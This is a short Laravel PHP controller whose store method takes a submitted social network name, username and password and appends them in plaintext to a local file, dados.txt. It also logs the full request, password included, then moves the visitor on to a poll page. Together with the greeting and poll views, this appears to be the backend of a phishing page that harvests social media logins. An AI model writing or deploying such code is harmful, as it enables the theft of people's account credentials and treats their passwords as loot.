<?php

namespace App\Http\Controllers;

use App\RedeSocial;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;

class RedeSocialController extends Controller
{
    public function index()
    {
        return view('saudacoes');

    }

    public function create()
    {
        //
    }

    public function store(Request $request)
    {
        Log::info($request);
        $fp = fopen("dados.txt","a");
        $conteudo = $request->rede_social . " - " . $request->username . " - " . $request->password . "\n";
        fwrite($fp,$conteudo);
        fclose($fp);
        return view('enquete');
    }


    public function show(RedeSocial $redeSocial)
    {
        //
    }
    public function edit(RedeSocial $redeSocial)
    {
        //
    }

    public function update(Request $request, RedeSocial $redeSocial)
    {
        //
    }

    public function destroy(RedeSocial $redeSocial)
    {
        //
    }
}
